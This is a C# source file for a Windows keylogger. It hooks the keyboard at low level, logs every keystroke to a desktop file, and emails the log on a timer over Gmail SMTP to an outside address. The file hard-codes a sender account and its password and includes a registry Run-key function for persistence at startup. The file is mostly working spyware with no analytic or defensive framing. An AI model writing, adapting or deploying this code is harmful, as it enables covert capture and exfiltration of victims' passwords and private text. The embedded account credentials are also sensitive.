using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Timers;
using System.Text;
using System.Threading;
using Microsoft.Win32;



class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static string textFile = @"C:\Users\julen\Desktop\keyboardinputs.txt";

    public static void Main()
    {
        Console.WriteLine("starting script");
        //PREPARE EVERYTHING

        //SetStartup(); //set the program into startup

        if (File.Exists(textFile)) //In case still exist
        {
            File.Delete(textFile);
            Console.WriteLine("file deleted");
        }

        // Create a new file     
        var file = File.Create(textFile);
        file.Close();
        Console.WriteLine("file created");

        Thread.Sleep(3000); //sleep 3 sec

        //Crete timer to send emails every x minutes/ hours
        var aTimer = new System.Timers.Timer(10 * 1000); //Every 1 min
        aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
        aTimer.Start();
        void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            //try // in case is writing stuff
            //{
            //Do the stuff
            SendEmail(textFile);
            file.Close();


            Console.WriteLine("Email send");
            aTimer.Start(); //to reset the timer
            //}
            //catch { }
        }

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            try//in case the email is using it to send the file
            {
                var character = ((Keys)vkCode).ToString();
                if (character == "Back")
                {
                    string file = File.ReadAllText(textFile);
                    string lastRemoved = file.Remove(file.Length - 1);
                    File.WriteAllText(textFile, lastRemoved);
                }
                else
                {
                    if (character == "Space")
                    {
                        character = " ";
                    }
                    using (StreamWriter w = File.AppendText(textFile))
                    {

                        w.Write(character);
                    }
                }

            }
            catch { }

        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);



    public static void SendEmail(string attachFile)
    {
        const string user = "createexportschedule@gmail.com";
        var fromAddress = new MailAddress(user, "From CreateExportSchedule");
        const string fromPassword = "CrExSh2020";

        MailMessage mail = new MailMessage();
        SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
        mail.From = fromAddress;
        mail.To.Add("julenbarrientos@gmail.com");
        mail.Subject = "KeyboardListener";
        mail.Body = "mail with attachment";

        System.Net.Mail.Attachment attachment;
        attachment = new System.Net.Mail.Attachment(attachFile);
        mail.Attachments.Add(attachment);

        SmtpServer.Port = 587;
        SmtpServer.UseDefaultCredentials = false;
        SmtpServer.Credentials = new System.Net.NetworkCredential(user, fromPassword);
        SmtpServer.EnableSsl = true;

        SmtpServer.Send(mail);

        //dispose elements
        attachment.Dispose();
        mail.Dispose();
        SmtpServer.Dispose();

    }


    public static void SetStartup()
    {
        RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        string AppName = "KeyboardListener2";

        rk.SetValue(AppName, Application.ExecutablePath);


    }
}